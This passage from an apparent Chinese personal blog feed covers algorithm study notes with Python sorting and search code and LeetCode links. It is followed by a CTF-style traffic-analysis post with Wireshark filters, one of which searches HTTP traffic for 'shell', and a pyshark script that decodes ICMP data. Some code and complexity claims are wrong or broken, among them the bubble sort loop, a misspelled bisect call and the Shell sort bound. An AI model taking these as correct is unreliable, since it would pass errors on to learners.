区间dp</h4><blockquote><p>从小区间转移到大区间。</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/minimum-cost-to-merge-stones/">1000. 合并石头的最低成本 - 力扣（LeetCode）</a></li><li><a href="https://leetcode.cn/problems/longest-palindromic-subsequence/">516. 最长回文子序列</a></li><li><a href="https://leetcode.cn/problems/minimum-score-triangulation-of-polygon/">1039. 多边形三角剖分的最低得分</a></li></ul></blockquote><h4 id="4-5-数位dp"><a href="#4-5-数位dp" class="headerlink" title="4.5 数位dp"></a>4.5 数位dp</h4><blockquote><p>题型：给定一个闭区间 [ L , R ]，求这个区间中满足 “某种条件” 的数的总量。</p><p>思路：$Ans[L,R] = Ans[1,R] - Ans[1,L-1]$（求出全部后减去下界）</p></blockquote><h3 id="5-查找"><a href="#5-查找" class="headerlink" title="5 查找"></a>5 查找</h3><h4 id="5-1-二分查找"><a href="#5-1-二分查找" class="headerlink" title="5.1 二分查找"></a>5.1 二分查找</h4><blockquote><p><a href="https://blog.csdn.net/YMWM_/article/details/122378152">bisect库</a></p><p>求最小中的最大值或者最大值中的最小值，一般可以考虑二分查找。</p><p>有序列表，中间开始找，然后依次缩小一半。</p><p>注意：明确 lp 和 rp 指向的区间是开还是闭区间，否则容易死循环。</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array/">34. 在排序数组中查找元素的第一个和最后一个位置</a></li><li><a href="https://leetcode.cn/problems/find-peak-element/">162. 寻找峰值</a></li><li><a href="https://leetcode.cn/problems/find-minimum-in-rotated-sorted-array/">153. 寻找旋转排序数组中的最小值</a></li><li><a href="https://leetcode.cn/problems/search-in-rotated-sorted-array/">33. 搜索旋转排序数组</a></li></ul></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接调库</span></span><br><span class="line"><span class="keyword">import</span> bisect</span><br><span class="line">bisect(ls,x) <span class="comment"># 同right</span></span><br><span class="line">bisect_left(ls,x) <span class="comment"># 最左边的</span></span><br><span class="line">bisec_right(ls,x) <span class="comment"># 最右边的并且结果idx加一</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 手写</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_search</span>(<span class="params">arr, low, high, x</span>):</span><br><span class="line">    arr.sort()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> arr[mid] == x:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> arr[mid] &gt; x:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="5-2-二叉搜索树"><a href="#5-2-二叉搜索树" class="headerlink" title="5.2 二叉搜索树"></a>5.2 二叉搜索树</h4><blockquote><p>对一个节点来说，左子树的值都小于它，右子树的值都大于它。</p><p>前序遍历：根左右。</p><p>中序遍历：左根右。</p><p>后序遍历：左右根。</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></li></ul></blockquote><h4 id="5-3-二叉树的最近公共祖先"><a href="#5-3-二叉树的最近公共祖先" class="headerlink" title="5.3 二叉树的最近公共祖先"></a>5.3 二叉树的最近公共祖先</h4><blockquote><p>获得左右值是否等于目标值，判断值存在以此判断祖先。</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a></li><li><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. 二叉搜索树的最近公共祖先</a></li></ul></blockquote><h4 id="5-4-BFS"><a href="#5-4-BFS" class="headerlink" title="5.4 BFS"></a>5.4 BFS</h4><blockquote><p>广度优先搜索。</p><p>时间：$O( |V| + |E| )$（节点数 + 边数）</p><p>为了跟踪顶点的加入过程，并避免重复顶点，要为顶点增加3个属性：</p><ul><li>distance：从起始顶点到此顶点路径长度</li><li>predecessor：可反向追溯到起点</li><li>color：标识了此顶点是尚未发现（白色)、已经发现（灰色)、还是已经完成探索（黑色）</li><li>还需要用一个队列 Queue 来对已发现的顶点进行排列：<br>决定下一个要探索的顶点（队首顶点）</li></ul><p>从起始顶点s开始，作为刚发现的顶点，标注为灰色，距离为0，前驱为None，加入队列，接下来是个循环迭代过程：</p><ol><li>从队首取出一个顶点作为当前顶点。</li><li>遍历当前顶点的邻接顶点，如果是尚未发现的白色顶点，则将其颜色改为灰色（已发现），距离增加1，前驱顶点为当前顶点，加入到队列中。</li><li>遍历完成后，将当前顶点设置为黑色(已探索过)，循环回到步骤1的队首取当前顶点。</li></ol><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></li><li><a href="https://leetcode.cn/problems/binary-tree-zigzag-level-order-traversal/">103. 二叉树的锯齿形层序遍历</a></li><li><a href="https://leetcode.cn/problems/find-bottom-left-tree-value/">513. 找树左下角的值</a></li></ul></blockquote><h4 id="5-5-DFS"><a href="#5-5-DFS" class="headerlink" title="5.5 DFS"></a>5.5 DFS</h4><blockquote><p>深度优先搜索。</p><p>添加属性同理于BFS，过程是从顶点开始一直向下搜索，直到没有路径可以走且结束条件为满足时返回上一层，继续搜索。<br>还需要用一个栈 Stack 来记录探索过的顶点。（用于返回上一顶点）</p><p>有时候深度优先搜索会创建多棵树，称为 “深度优先森林”<br>时间：$O( |V| + |E| )$（dfs + dfsvisit）</p></blockquote><h3 id="6-排序"><a href="#6-排序" class="headerlink" title="6 排序"></a>6 排序</h3><blockquote><p><a href="https://visualgo.net/zh/sorting?slide=1">可视化排序</a></p></blockquote><h4 id="6-1-冒泡排序"><a href="#6-1-冒泡排序" class="headerlink" title="6.1 冒泡排序"></a>6.1 冒泡排序</h4><blockquote><p>冒泡排序：每次将最大或最小项置顶，不断交换位置，直到完成遍历。</p><p>改进：加一个exchanges = False，如果一趟循环未发生任何排序则保持False表示已经排好了序。</p><p>时间：$O(n^2)$</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">if</span> lst[i] &gt; lst[j]:</span><br><span class="line">            lst[i],lst[j] = lst[j],lst[i]</span><br></pre></td></tr></table></figure><h4 id="6-2-选择排序"><a href="#6-2-选择排序" class="headerlink" title="6.2 选择排序"></a>6.2 选择排序</h4><blockquote><p>同理冒泡，但是一开始不做交换，只记录位置，到单次循环的最后一次才进行交换。就是每次选一个最大或最小的值放到最前面。</p><p>时间：$O(n^2)$</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">selection_sort</span>(<span class="params">arr</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">        min_index = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">if</span> arr[j] &lt; arr[min_index]:</span><br><span class="line">                min_index = j</span><br><span class="line">        arr[i], arr[min_index] = arr[min_index], arr[i]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h4 id="6-3-插入排序"><a href="#6-3-插入排序" class="headerlink" title="6.3 插入排序"></a>6.3 插入排序</h4><blockquote><p>维持一个已经排好序的子列表，位置一直在列表前部，然后逐步扩大到这个子列表直到全表，例如抓牌。</p><p>时间：$O(n^2)$</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">insertion_sort</span>(<span class="params">arr</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">        key = arr[i]</span><br><span class="line">        j = i - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> j &gt;= <span class="number">0</span> <span class="keyword">and</span> arr[j] &gt; key:</span><br><span class="line">            arr[j+<span class="number">1</span>] = arr[j]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">        arr[j+<span class="number">1</span>] = key</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h4 id="6-4-希尔排序"><a href="#6-4-希尔排序" class="headerlink" title="6.4 希尔排序"></a>6.4 希尔排序</h4><blockquote><p>因为列表越有序，插入排序比对次数越少，所以希尔排序就是分块的插入排序。间隔一般为n / 2，例：选1,4,7项。</p><p>时间：$O(n^{\frac{2}{3}})$ </p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h4 id="6-5-归并排序"><a href="#6-5-归并排序" class="headerlink" title="6.5 归并排序"></a>6.5 归并排序</h4><blockquote><p> 递归算法，将数据表持续分裂成两半，对两半分别进行归并排序。（稳定）<br>​​<br>​时间分裂：$O(logn)$，归并：$O(n)$，总：$O(nlogn)$，会牺牲空间</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge_Sort</span>(<span class="params">lst:<span class="built_in">list</span></span>)-&gt;<span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(lst) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> lst</span><br><span class="line">    mid = <span class="built_in">len</span>(lst) // <span class="number">2</span></span><br><span class="line">    left = merge_Sort(lst[:mid])</span><br><span class="line">    right = merge_Sort(lst[mid:])</span><br><span class="line">    merged = []</span><br><span class="line">    <span class="keyword">while</span> left <span class="keyword">and</span> right:</span><br><span class="line">        <span class="keyword">if</span> left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]:</span><br><span class="line">            merged.append(left.pop(<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            merged.append(right.pop(<span class="number">0</span>))</span><br><span class="line">    merged.extend(right <span class="keyword">if</span> right <span class="keyword">else</span> left)</span><br><span class="line">    <span class="keyword">return</span> merged</span><br><span class="line"><span class="built_in">print</span>(merge_Sort([<span class="number">93</span>,<span class="number">54</span>,<span class="number">12</span>,<span class="number">74</span>,<span class="number">21</span>,<span class="number">5</span>,<span class="number">78</span>,<span class="number">22</span>,<span class="number">94</span>,<span class="number">34</span>]))</span><br></pre></td></tr></table></figure><h4 id="6-6-快速排序"><a href="#6-6-快速排序" class="headerlink" title="6.6 快速排序"></a>6.6 快速排序</h4><blockquote><p>递归算法，依据一个”中值”数据项把数据表分为两半：小于中值的一半和大于中值的一半，然后再分别进行快速排序。（不稳定）</p><p>时间总能分裂：$O(logn)$，移动：$O(n)$，总：$O(nlogn)$</p><p>若中值偏离中部，时间：$O(n^2)$，因为递归会导致其不如冒泡，</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">quickSort</span>(<span class="params">lst:<span class="built_in">list</span></span>):</span><br><span class="line">    quickSortHelper(lst,<span class="number">0</span>,<span class="built_in">len</span>(lst)-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quickSortHelper</span>(<span class="params">lst:<span class="built_in">list</span>,first:<span class="built_in">int</span>,last:<span class="built_in">int</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> first &lt; last:</span><br><span class="line">        splitpoint = partition(lst,first,last)</span><br><span class="line">        quickSortHelper(lst,first,splitpoint-<span class="number">1</span>)</span><br><span class="line">        quickSortHelper(lst,splitpoint+<span class="number">1</span>,last)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">lst:<span class="built_in">list</span>,first:<span class="built_in">int</span>,last:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    pivotvalue = lst[first]</span><br><span class="line">    leftmark = first + <span class="number">1</span></span><br><span class="line">    rightmark = last</span><br><span class="line">    done = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        <span class="keyword">while</span> leftmark &lt;= rightmark <span class="keyword">and</span> lst[leftmark] &lt;= pivotvalue:</span><br><span class="line">            leftmark = leftmark + <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> lst[rightmark] &gt;= pivotvalue <span class="keyword">and</span> rightmark &gt;= leftmark:</span><br><span class="line">            rightmark = rightmark - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> rightmark &lt; leftmark:</span><br><span class="line">            done = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lst[leftmark],lst[rightmark] = lst[rightmark],lst[leftmark]</span><br><span class="line">    lst[first],lst[rightmark] = lst[rightmark],lst[first]</span><br><span class="line">    <span class="keyword">return</span> rightmark</span><br><span class="line"></span><br><span class="line">lst = [<span class="number">54</span>,<span class="number">26</span>,<span class="number">93</span>,<span class="number">17</span>,<span class="number">77</span>,<span class="number">31</span>,<span class="number">44</span>,<span class="number">55</span>,<span class="number">20</span>]</span><br><span class="line">quickSort(lst)</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h4 id="6-7-堆排序"><a href="#6-7-堆排序" class="headerlink" title="6.7 堆排序"></a>6.7 堆排序</h4><blockquote><p>二叉堆的排序。</p><p>时间：$O(nlogn)$</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">heapify</span>(<span class="params">arr, n, i</span>):</span><br><span class="line">    largest = i</span><br><span class="line">    left = <span class="number">2</span> * i + <span class="number">1</span></span><br><span class="line">    right = <span class="number">2</span> * i + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> left &lt; n <span class="keyword">and</span> arr[left] &gt; arr[largest]:</span><br><span class="line">        largest = left</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> right &lt; n <span class="keyword">and</span> arr[right] &gt; arr[largest]:</span><br><span class="line">        largest = right</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> largest != i:</span><br><span class="line">        arr[i], arr[largest] = arr[largest], arr[i]</span><br><span class="line">        heapify(arr, n, largest)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heap_sort</span>(<span class="params">arr</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n//<span class="number">2</span> - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        heapify(arr, n, i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        arr[i], arr[<span class="number">0</span>] = arr[<span class="number">0</span>], arr[i]</span><br><span class="line">        heapify(arr, i, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="6-8-桶排序"><a href="#6-8-桶排序" class="headerlink" title="6.8 桶排序"></a>6.8 桶排序</h4><blockquote></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bucket_sort</span>(<span class="params">arr, num_buckets</span>):</span><br><span class="line">    max_val = <span class="built_in">max</span>(arr)</span><br><span class="line">    min_val = <span class="built_in">min</span>(arr)</span><br><span class="line">    bucket_range = (max_val - min_val) / num_buckets</span><br><span class="line"></span><br><span class="line">    buckets = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_buckets)]</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> arr:</span><br><span class="line">        index = <span class="built_in">int</span>((num - min_val) // bucket_range)</span><br><span class="line">        <span class="keyword">if</span> index == num_buckets:</span><br><span class="line">            index -= <span class="number">1</span></span><br><span class="line">        buckets[index].append(num)</span><br><span class="line"></span><br><span class="line">    sorted_arr = []</span><br><span class="line">    <span class="keyword">for</span> bucket <span class="keyword">in</span> buckets:</span><br><span class="line">        sorted_arr.extend(<span class="built_in">sorted</span>(bucket))</span><br><span class="line">    <span class="keyword">return</span> sorted_arr</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="6-9-基数排序"><a href="#6-9-基数排序" class="headerlink" title="6.9 基数排序"></a>6.9 基数排序</h4><blockquote></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">radix_sort</span>(<span class="params">arr</span>):</span><br><span class="line">    max_val = <span class="built_in">max</span>(arr)</span><br><span class="line">    exp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> max_val // exp &gt; <span class="number">0</span>:</span><br><span class="line">        counting_sort_by_digit(arr, exp)</span><br><span class="line">        exp *= <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">counting_sort_by_digit</span>(<span class="params">arr, exp</span>):</span><br><span class="line">    count = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line">    sorted_arr = [<span class="number">0</span>] * <span class="built_in">len</span>(arr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> arr:</span><br><span class="line">        index = (num // exp) % <span class="number">10</span></span><br><span class="line">        count[index] += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        count[i] += count[i-<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        index = (arr[i] // exp) % <span class="number">10</span></span><br><span class="line">        sorted_arr[count[index]-<span class="number">1</span>] = arr[i]</span><br><span class="line">        count[index] -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        arr[i] = sorted_arr[i]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="6-10-计数排序"><a href="#6-10-计数排序" class="headerlink" title="6.10 计数排序"></a>6.10 计数排序</h4><blockquote><ol><li>找出待排序数组中的最大值 <code>maxVal</code> 和最小值 <code>minVal</code>。</li><li>创建一个长度为 <code>maxVal - minVal + 1</code> 的计数数组 <code>countArray</code>，用于统计每个元素的出现次数。</li><li>遍历待排序数组，统计每个元素出现的次数并存储到 <code>countArray</code> 中。</li><li>计算每个元素在排序后的数组中的起始位置（前缀和），修改 <code>countArray</code> 使其表示元素应该放置的位置。</li><li>创建一个与待排序数组相同大小的结果数组 <code>resultArray</code>。</li><li>遍历待排序数组，根据元素的值和 <code>countArray</code> 中记录的位置信息，将元素放入 <code>resultArray</code> 的正确位置。</li><li>返回 <code>resultArray</code> 即为排序后的数组。</li></ol><p>时间：<script type="math/tex">O(n + k)</script></p><p>空间：<script type="math/tex">O(n + k)</script></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">countingSort</span>(<span class="params">arr</span>):</span><br><span class="line">    maxVal = <span class="built_in">max</span>(arr)</span><br><span class="line">    minVal = <span class="built_in">min</span>(arr)</span><br><span class="line">    countArray = [<span class="number">0</span>] * (maxVal - minVal + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> arr:</span><br><span class="line">        countArray[num - minVal] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(countArray)):</span><br><span class="line">        countArray[i] += countArray[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    resultArray = [<span class="number">0</span>] * <span class="built_in">len</span>(arr)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> arr:</span><br><span class="line">        index = countArray[num - minVal] - <span class="number">1</span></span><br><span class="line">        resultArray[index] = num</span><br><span class="line">        countArray[num - minVal] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resultArray</span><br></pre></td></tr></table></figure><h3 id="7-条件"><a href="#7-条件" class="headerlink" title="7 条件"></a>7 条件</h3><h4 id="7-1-单调栈"><a href="#7-1-单调栈" class="headerlink" title="7.1 单调栈"></a>7.1 单调栈</h4><blockquote><p>场景：前值小于后值的最小索引位。</p><p>例子：</p><ul><li><a href="https://leetcode.cn/problems/online-stock-span/">901. 股票价格跨度</a></li><li><a href="https://leetcode.cn/problems/next-greater-node-in-linked-list/">1019. 链表中的下一个更大节点</a></li></ul></blockquote><h4 id="7-2-双指针"><a href="#7-2-双指针" class="headerlink" title="7.2 双指针"></a>7.2 双指针</h4><blockquote><p>同向双指针：</p><ul><li>又称为滑动窗口。</li><li>场景：找主串中的子串，满足条件时移动右指针，不满足条件时移动左指针。</li><li>方法：设置两个索引找到字符串中的两个位置。</li></ul><p>同向双指针例题：</p><ul><li><a href="https://leetcode.cn/problems/minimum-size-subarray-sum/">209. 长度最小的子数组</a></li><li><a href="https://leetcode.cn/problems/subarray-product-less-than-k/">713. 乘积小于 K 的子数组</a></li><li><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></li></ul><p>同向双指针习题：</p><ul><li><a href="https://leetcode.cn/problems/magical-string/">481. 神奇字符串</a></li><li><a href="https://leetcode.cn/problems/fruit-into-baskets/">904. 水果成篮</a></li></ul><p>——————————————————————</p><p>相向双指针：</p><ul><li>场景：有序列表中找两数之和，中间围成的面积。</li><li>方法：双指针，但是从头尾开始。</li></ul><p>相向双指针例题：</p><ul><li><a href="https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted/">167. 两数之和 II - 输入有序数组</a></li><li><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></li><li><a href="https://leetcode.cn/problems/container-with-most-water/">11. 盛最多水的容器</a></li><li><a href="https://leetcode.cn/problems/trapping-rain-water/">42. 接雨水</a></li></ul></blockquote><h4 id="7-3-前缀和"><a href="#7-3-前缀和" class="headerlink" title="7.3 前缀和"></a>7.3 前缀和</h4><blockquote><p>场景：需要用到数组中的前几项和。</p><p>方法：相加前几项存入新数组中。</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/shortest-subarray-with-sum-at-least-k/">862. 和至少为 K 的最短子数组</a></li><li><a href="https://leetcode.cn/problems/longest-well-performing-interval/">1124. 表现良好的最长时间段</a></li></ul></blockquote><h4 id="7-4-二进制位图"><a href="#7-4-二进制位图" class="headerlink" title="7.4 二进制位图"></a>7.4 二进制位图</h4><blockquote><p>场景：题目需求为两种情况时。</p><p>方法：设置二进制数来代表状态。</p><p>例题：</p><ul><li><p><a href="https://leetcode.cn/problems/power-of-two/">231. 2 的幂</a></p></li><li><p><a href="https://leetcode.cn/problems/letter-case-permutation/">784. 字母大小写全排列</a></p></li></ul></blockquote><h4 id="7-5-模运算"><a href="#7-5-模运算" class="headerlink" title="7.5 模运算"></a>7.5 模运算</h4><blockquote><p>场景：乘除取指定数字位数。</p><p>方法：</p><p>$(a+b)MODm=((aMODm)+(bMODm))MODm$</p><p>$(a<em>b)MODm=((aMODm)</em>(bMODm))MODm$</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/smallest-integer-divisible-by-k/">1015. 可被 K 整除的最小整数</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析工具</title>
      <link href="/posts/f60fa43a.html"/>
      <url>/posts/f60fa43a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Flow工具"><a href="#Flow工具" class="headerlink" title="Flow工具"></a>Flow工具</h1><blockquote><p><a href=".\7ab8e472">text::流量理论</a></p></blockquote><hr><h2 id="一、网络工具"><a href="#一、网络工具" class="headerlink" title="一、网络工具"></a>一、网络工具</h2><ul><li><p>Wireshark（抓包工具）</p><blockquote><p><a href="https://wiki.wireshark.org/SampleCaptures">SampleCaptures (wireshark.org)</a></p></blockquote><ul><li><p>工具使用</p><blockquote><p><a href="https://blog.csdn.net/a745233700/article/details/102774703">链接</a></p><p>视图——时间显示格式：改时间显示。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令简单使用：</span><br><span class="line">(host 10.4.1.12 or src net 10.6.0.0/16) and tcp dst portrange 200-10000 and dst net 10.0.0.0/8</span><br><span class="line"></span><br><span class="line">包含字符串的协议：</span><br><span class="line">http contains &quot;shell&quot;</span><br><span class="line"></span><br><span class="line">ip过滤：</span><br><span class="line">ip.addr==47.56.157.205</span><br><span class="line">ip.src / ip.dst</span><br><span class="line"></span><br><span class="line">协议：</span><br><span class="line">tcp / udp</span><br><span class="line"></span><br><span class="line">端口：</span><br><span class="line">tcp.port==80</span><br></pre></td></tr></table></figure></li><li><p>py编程</p><blockquote><p><a href="https://github.com/Magialeaf/Misc/blob/main/Flow/wireshark%E5%88%86%E6%9E%90.py">my::分析案例</a></p><p><a href="https://github.com/KimiNewt/pyshark/">pyshark包</a></p><p><a href="https://blog.csdn.net/qq_42411587/article/details/119909870">Tshark</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载本地的pcap文件，记得加路径，或者直接改config</span></span><br><span class="line">capture=pyshark.FileCapture(<span class="string">&#x27;fetus_pcap.pcap&#x27;</span>,tshark_path=<span class="string">&#x27;D:\CTF\Capoo\Internet\Wireshark\\&#x27;</span>)</span><br><span class="line"><span class="comment"># 协议类型</span></span><br><span class="line">pack.layer_name == <span class="string">&#x27;icmp&#x27;</span>:</span><br><span class="line"><span class="comment"># 加上int转类型，否则是类接下来无法迭代</span></span><br><span class="line"><span class="built_in">int</span>(pack.data_len)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = []</span><br><span class="line">    <span class="comment"># 加载本地的pcap文件</span></span><br><span class="line">    capture=pyshark.FileCapture(<span class="string">&#x27;fetus_pcap.pcap&#x27;</span>,tshark_path=<span class="string">&#x27;Wireshark\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> capture:</span><br><span class="line">        <span class="keyword">for</span> pack <span class="keyword">in</span> packet:</span><br><span class="line">            <span class="keyword">if</span> pack.layer_name == <span class="string">&#x27;icmp&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">int</span>(pack.<span class="built_in">type</span>) != <span class="number">0</span>:</span><br><span class="line">                    count.append(<span class="built_in">int</span>(pack.data_len))  <span class="comment"># 加上 int 转类型，否则是类接下来无法迭代</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count:</span><br><span class="line">        res += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="built_in">print</span>(base64.b64decode(res))</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="二、GPS工具"><a href="#二、GPS工具" class="headerlink" title="二、GPS工具"></a>二、GPS工具</h2><ul><li><p>GPS文件分析</p><blockquote><p><a href="https://www.gpsvisualizer.com/map_input">GPS文件分析网页</a></p></blockquote><ol><li><p><a href="https://www.gpsvisualizer.com/map_input">Make a HTML Map</a></p><blockquote><p>网页：选择文件 —— Draw the map</p></blockquote></li><li><p><a href="https://www.h-schmidt.net/NMEA/">txt转KML还原GPS</a>    <a href="https://mygeodata.cloud/converter/">KML可视化GPS</a></p><blockquote><p>选择 input 和 output 格式为 kml 和 CPS ，然后输出</p></blockquote></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件理论知识</title>
      <link href="/posts/71be2b51.html"/>
      <url>/posts/71be2b51.html</url>
      
